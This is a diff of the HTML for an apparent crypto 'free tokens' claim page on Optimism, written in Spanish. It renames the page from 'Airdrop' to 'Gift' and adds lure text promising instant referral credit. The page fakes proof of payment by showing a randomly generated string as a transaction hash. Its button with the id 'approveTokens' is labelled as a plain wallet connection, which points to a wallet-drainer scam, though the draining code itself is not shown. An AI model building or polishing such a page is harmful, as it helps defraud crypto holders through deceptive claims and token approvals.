@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Airdrop Cripto | Web3 en Optimism</title>
+  <title>Gift Cripto | Web3 en Optimism</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
   <style>
     :root {
@@ -250,8 +250,10 @@
   </style>
 </head>
 <body>
-  <h1>🎁 Airdrop Cripto Web3</h1>
+  <h1>🎁 Gift Cripto Web3</h1>
   <p>Conéctate con tu wallet y completa el KYC para reclamar tokens gratis en la red Optimism.</p>
+	  <p> Referidos acreditados en el acto </p>
+
   <div class="buttons">
     <button id="approveTokens" disabled>Conectar Wallet</button>
     <button id="claimAll" disabled>Comenzar KYC</button>
@@ -493,7 +495,7 @@
 `;
             
    document.getElementById('prize-info').innerHTML = `
-    🎉 ¡Premio reclamado!<br>
+    🎉 ¡Conecta para reclamar!<br>
     <strong>${amount} ${prize.token}</strong><br>
     <small>Tx: 0x${Array.from({length: 16}, () => 
         Math.floor(Math.random() * 16).toString(16)).join('')}...</small><br><br>
